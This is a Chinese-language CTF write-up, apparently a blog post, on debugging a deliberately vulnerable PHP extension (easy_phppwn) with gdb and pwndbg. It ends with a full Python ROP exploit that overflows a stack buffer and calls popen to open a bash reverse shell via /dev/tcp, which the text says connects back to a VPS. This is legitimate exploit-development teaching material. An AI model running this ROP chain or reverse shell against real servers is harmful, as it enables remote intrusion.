    easy_phppwn($a);
    ?>
之后在终端中我们执行该文件:
    $> php easy.php
    The baby phppwn.
成功输出，则说明该扩展函数成功被调用  
下面我们使用gdb来调试，这里我们主要测试memcpy导致的buf变量溢出，首先我编写了一个exp.py文件来生成带payload的.php文件，如下：
    # exp.py
    from pwn import *
    def create_php(buf):
        with open("pwn.php", 'w+') as pf:
            pf.write(''''''%urlencode(buf))
    buf = 'a'*0x80
    buf += 'b'*0x10
    create_php(buf)
运行exp
    $> python exp.py
    $> php pwn.php
    The baby phppwn.
    [1]    23692 segmentation fault (core dumped)  php pwn.php
说明成功触发栈溢出，现在我们使用gdb来进行调试，首先我这里假设我们之前在漏洞网站上已经泄露了maps文件已经获得了php进程的内存布局，所以我这里先关闭了本地随机化
    $>gdb php
    pwndbg> run
    Starting program: /usr/bin/php 
    [Thread debugging using libthread_db enabled]
    Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
运行run以后，php在等待我们的输入，我们直接`ctrl+c` 终止掉程序，但是这里是不会退出gdb的，而是如下所示:
    Program received signal SIGINT
    pwndbg>
查看vmmap
    pwndbg>vmmap
    ...
        0x7ffff28f4000     0x7ffff28f5000 r-xp     1000 0      /usr/lib/php/20170718/easy_phppwn.so
        0x7ffff28f5000     0x7ffff2af5000 ---p   200000 1000   /usr/lib/php/20170718/easy_phppwn.so
        0x7ffff2af5000     0x7ffff2af6000 r--p     1000 1000   /usr/lib/php/20170718/easy_phppwn.so
        0x7ffff2af6000     0x7ffff2af7000 rw-p     1000 2000   /usr/lib/php/20170718/easy_phppwn.so
    ...
这里我们已经可以看到php 已经加载了 easy_phppwn.so  
所以我们现在可以设置断点了，如果在run之前设置会提示找不到该函数，设置断点我们需要设置真正的函数名，其实是`zif_funcname`，也就是我们在ida中看到的函数名，这里就是`zif_easy_phppwn`，同时设置参数为之前生成的pwn.php文件
    pwndbg>break zif_easy_phppwn
    pwndbg>set args ./pwn.php
    pwndbg>run
    ...
    Breakpoint zif_easy_phppwn
    pwndbg>
如果成功，则说明我们现在已经进入了该函数，现在我们可以开始进行调试rop链了，对了，如果该扩展是在本地编译的话是有源码的，所以这里可以直接进行源码级别的调试
    ...
    ────────────[ DISASM ]────────
     ► 0x7ffff28f4c46     mov    qword ptr [rbp - 8], 0
       0x7ffff28f4c4e     mov    rax, qword ptr [rbp - 0x88]
       0x7ffff28f4c55     mov    eax, dword ptr [rax + 0x2c]
       0x7ffff28f4c58     mov    edi, eax
       0x7ffff28f4c5a     lea    rdx, [rbp - 0x10]
       0x7ffff28f4c5e     lea    rax, [rbp - 8]
       0x7ffff28f4c62     mov    rcx, rdx
       0x7ffff28f4c65     mov    rdx, rax
       0x7ffff28f4c68     lea    rsi, [rip + 0xe5]
       0x7ffff28f4c6f     mov    eax, 0
       0x7ffff28f4c74     call   zend_parse_parameters@plt 
    ────────────[ SOURCE (CODE) ]────────
    In file: /home/pwn/Desktop/phppwn/php-src-php-7.2.24/ext/easy_phppwn/easy_phppwn.c
       71    function definition, where the functions purpose is also documented. Please
       72    follow this convention for the convenience of others editing your code.
       73 */
       74 PHP_FUNCTION(easy_phppwn)
       75 {
     ► 76   char *arg = NULL;
       77   size_t arg_len, len;
       78   char buf[100];
       79   if (zend_parse_parameters(ZEND_NUM_ARGS(), "s", &arg, &arg_len) == FAILURE) {
       80           return;
       81   }
    ────────────[ STACK ]────────
    ...
这样我们就可以愉快的进行调试了，当然开篇我已经提到，phppwn题目来说，是基本没法使用one_gadget,system(‘/bin/sh’)来直接获取交互式shell的，所以我这里通过使用popenv来开启一个反弹shell到vps上，当然其实还可以使用rop链构造调用`mprotect`函数来给stack执行权限，然后找一个`jmp
rsp`来直接执行shellcode，这样就不用去算栈偏移了，不过也差不多。
完整exp如下：
    from pwn import *
    context.arch = "amd64"
    def create_php(buf):
        with open("pwn.php", 'w+') as pf:
            pf.write(''''''%urlencode(buf))
    libc = ELF("./libc-2.27.so")
    libc.address = 0x7ffff5e25000
    pop_rdi_ret = 0x2155f+libc.address
    pop_rsi_ret = 0x23e6a+libc.address
    popen_addr = libc.sym['popen']
    command = '/bin/bash -c "/bin/bash -i >&/dev/tcp/127.0.0.1/6666 0>&1"'
    stack_base = 0x7ffffffde000
    stack_offset = 0x1c330
    stack_addr = stack_offset+stack_base
    layout = [
        'a'*0x88,
        pop_rdi_ret,
        stack_addr+0x88+0x30+0x60,
        pop_rsi_ret,
        stack_addr+0x88+0x28,
        popen_addr,
        'r'+'x00'*7,
        'a'*0x60,
        command.ljust(0x60, 'x00'),
        "a"*0x8
    ]
    buf = flat(layout)
    create_php(buf)
最终效果如下：
## 总结
其实webpwn类型的题目，对大部分选手来说，主要可能是难在调试环节上，网上基本没有详细介绍的文章，de1CTF那道webpwn，我本地打通了，但是由于libc的问题，导致服务没打通，有点可惜了，这里借此记录一下我个人调试的流程方法，分享给各位师傅。
## 参考
[Wupco’s Blog-phppwn入门](http://www.wupco.cn/?p=4504)